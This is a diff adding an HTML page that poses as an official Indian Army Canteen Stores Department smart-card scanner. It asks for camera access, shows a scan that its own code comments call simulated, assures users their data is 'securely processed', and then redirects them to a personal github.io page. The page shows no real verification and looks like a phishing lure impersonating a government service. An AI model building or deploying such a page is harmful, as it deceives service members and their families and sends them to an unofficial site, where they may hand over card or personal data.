@@ -1,0 +1,271 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSD Scanner Pro</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/feather-icons"></script>
+    <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        :root {
+            --primary: #3b82f6;
+            --secondary: #10b981;
+            --accent: #6366f1;
+            --dark: #1e293b;
+            --light: #f8fafc;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
+                        url('https://img.freepik.com/premium-photo/free-vector-decorative-tricolor-indian-flag-theme-texture_911078-1073.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: var(--light);
+            min-height: 100vh;
+            backdrop-filter: blur(2px);
+        }
+
+        .bg-glass {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .preloader-animation {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: conic-gradient(var(--primary) 0%, transparent 80%);
+            animation: spin 1.5s linear infinite;
+            display: grid;
+            place-items: center;
+        }
+
+        .preloader-animation::after {
+            content: '';
+            width: 70px;
+            height: 70px;
+            background: inherit;
+            border-radius: 50%;
+            backdrop-filter: blur(5px);
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .scan-animation {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+        }
+
+        .scan-frame {
+            position: relative;
+            overflow: hidden;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .scan-frame::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+            animation: scan 2s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(100%); }
+        }
+
+        .corner {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--primary);
+        }
+
+        .corner-tl {
+            top: 10px;
+            left: 10px;
+            border-right: none;
+            border-bottom: none;
+        }
+
+        .corner-tr {
+            top: 10px;
+            right: 10px;
+            border-left: none;
+            border-bottom: none;
+        }
+
+        .corner-bl {
+            bottom: 10px;
+            left: 10px;
+            border-right: none;
+            border-top: none;
+        }
+
+        .corner-br {
+            bottom: 10px;
+            right: 10px;
+            border-left: none;
+            border-top: none;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center">
+    <!-- Preloader -->
+    <div id="preloader" class="fixed inset-0 z-50 flex flex-col items-center justify-center bg-gray-900 transition-opacity duration-500">
+        <div class="preloader-animation mb-6"></div>
+        <div class="text-center">
+            <h2 class="text-xl font-semibold mb-2">CSD Smart Card Scanner</h2>
+            <p class="text-gray-300">Indian Army Canteen Stores Department </p>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div id="main" class="hidden w-full max-w-md mx-4">
+        <div class="bg-glass rounded-2xl p-8 shadow-2xl">
+            <div class="flex flex-col items-center">
+                <div class="w-24 h-24 rounded-xl bg-gradient-to-br from-white-500 to-indigo-600 flex items-center justify-center mb-6 shadow-lg">
+    <img src="https://www.theteamwork.com/articles/wp-content/uploads/2020/02/canteen-stores-department.jpg" alt="Small Image" class="w-50 h-60 object-contain rounded" />
+</div>
+
+                <h1 class="text-2xl font-bold mb-2">CSD CARD SCANNER</h1>
+                <p class="text-gray-300 text-center mb-6">Position Your Card Within The Frame For Verification</p>
+                
+                <button id="scanBtn" class="px-8 py-3 bg-gradient-to-r from-blue-500 to-indigo-600 rounded-full font-semibold text-white shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105 focus:outline-none">
+                    <span>SCAN CARD</span>
+                    <i data-feather="camera" class="ml-2 w-5 h-5 inline"></i>
+                </button>
+                
+                <p class="text-gray-400 text-sm mt-4 text-center">
+                    <i data-feather="shield" class="w-4 h-4 inline mr-1"></i>
+                    Your Data Is Securely Processed
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Camera Overlay -->
+    <div id="cameraOverlay" class="fixed inset-0 z-40 hidden flex-col items-center justify-center bg-black bg-opacity-90">
+        <div class="relative w-full max-w-md h-64 mb-8 scan-frame rounded-xl">
+            <div class="corner corner-tl"></div>
+            <div class="corner corner-tr"></div>
+            <div class="corner corner-bl"></div>
+            <div class="corner corner-br"></div>
+            
+            <video id="camVideo" autoplay muted playsinline class="w-full h-full object-cover"></video>
+            
+            <div class="absolute inset-0 flex items-center justify-center hidden" id="processing">
+                <div class="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+            </div>
+        </div>
+        
+        <div class="text-center text-gray-300 mt-4">
+            <p>Align your CSD card within the frame</p>
+            <p class="text-sm text-gray-400 mt-2">Scanning in progress...</p>
+        </div>
+        
+        <button id="closeBtn" class="mt-6 px-6 py-2 bg-gray-800 rounded-full text-white font-medium hover:bg-gray-700 transition-colors">
+            <i data-feather="x" class="w-5 h-5 inline mr-2"></i>
+            Cancel
+        </button>
+    </div>
+
+    <script>
+        // Initialize Feather Icons
+        feather.replace();
+        
+        // Elements
+        const preloader = document.getElementById('preloader');
+        const main = document.getElementById('main');
+        const scanBtn = document.getElementById('scanBtn');
+        const closeBtn = document.getElementById('closeBtn');
+        const overlay = document.getElementById('cameraOverlay');
+        const camVideo = document.getElementById('camVideo');
+        const processing = document.getElementById('processing');
+        
+        let stream = null;
+
+        // Hide preloader after 3 seconds
+        setTimeout(() => {
+            preloader.classList.add('hidden');
+            main.classList.remove('hidden');
+        }, 3000);
+
+        // Start scanning
+        scanBtn.addEventListener('click', async () => {
+            try {
+                overlay.classList.remove('hidden');
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "environment" }
+                });
+                camVideo.srcObject = stream;
+                
+                // Simulate scanning process
+                setTimeout(() => {
+                    processing.classList.remove('hidden');
+                    
+                    setTimeout(() => {
+                        processing.innerHTML = `
+                            <div class="text-center">
+                                
+                                <p class="text-green-500 font-medium">Please Wait ...</p>
+                                <p class="text-gray-400 text-sm mt-1"></p>
+                            </div>
+                        `;
+                        feather.replace();
+                        
+                        setTimeout(() => {
+                            stopCamera();
+                            window.location.href = "https://manishchaudhary525.github.io/csd/";
+                        }, 5000);
+                    }, 2000);
+                }, 1500);
+            } catch (err) {
+                alert('Unable to access the camera. Please check permissions.');
+                stopCamera();
+            }
+        });
+
+        // Close camera
+        closeBtn.addEventListener('click', stopCamera);
+        
+        // Stop camera function
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            overlay.classList.add('hidden');
+            processing.classList.add('hidden');
+        }
+
+        // Close camera when clicking outside the scan area
+        overlay.addEventListener('click', (e) => {
+            if (e.target === overlay) {
+                stopCamera();
+            }
+        });
+
+        // Stop camera when page is hidden
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                stopCamera();
+            }
+        });
+    </script>
+</body>
+</html>
